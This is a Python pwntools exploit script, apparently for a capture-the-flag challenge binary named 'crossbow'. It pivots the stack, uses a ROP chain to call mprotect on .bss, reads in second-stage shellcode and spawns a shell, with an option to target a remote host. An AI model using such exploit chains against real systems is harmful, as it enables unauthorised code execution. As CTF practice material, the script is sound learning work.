#!/usr/bin/env python3

from pwn import *

e = ELF("./crossbow_patched")
# libc = elf('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(training+69)
                      b *(target_dummy+354)
                      b *(training+0x7d)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()
    # TODO: Somehow this doesn't work, the fgets() in the stage_1 code just cannot read data into the .bss.

    # About how to call these libc functions, use godbolt.org with following snippet:
##include <sys/mman.h>
##include <stdio.h>

# int main() {
#     char buff[10];
#     mprotect(buff, 10, PROT_EXEC|PROT_READ|PROT_WRITE);
#     fgets(buff, 10, 0);
#     return 0;
# }

    # Overwrites the $rbp value saved on stack to the newly allocated heap address.
    # When the training() returns, $rsp will be changed to this heap address. (mov rsp, rbp; pop rbp; ret)
    # Thus we control the whole function stack frame, making ROP feasible.
    r.sendlineafter(b'shoot:', b'-2')
    info(f'.BSS is at {hex(e.bss())}')
    rop = ROP(e)
    shellcode_addr = e.bss(offset=0x200) # leave some buffer for .bss original content
    stage_2_buffer_size = 8
    stage_1 = flat(
            # Change bss NX bit
            b'\x90' * 8, # garbage for "pop rbp" in training()
            rop.rdi[0], e.bss(), # addr
            rop.rsi[0], 0x1000, # size
            rop.rdx[0], 0x7, # rwx
            e.sym.mprotect,
            # Read the next stage shellcode to bss
            rop.rdi[0], shellcode_addr,
            rop.rsi[0], 0x80,
            rop.rdx[0], e.sym.__stdin_FILE,
            e.sym.fgets_unlocked,
            shellcode_addr + stage_2_buffer_size,
            )
    success(f'stage_1 bytes are {hex(len(stage_1))}') # 0x80, just as big as the allowed size.
    r.send(stage_1)

    # stage 2 is to send the actual shellcode.
    stage_2_buffer_size = 8
    stage_2 = flat(
            # !!!!Note that we need extra buffer here because somehow the first few instructions may be interpreted incorrectly with 0s before it.
            b'\x90' * 8,
            asm(shellcraft.sh()),
            )
    r.sendline(stage_2)

    r.interactive()

if __name__ == "__main__":
    main()
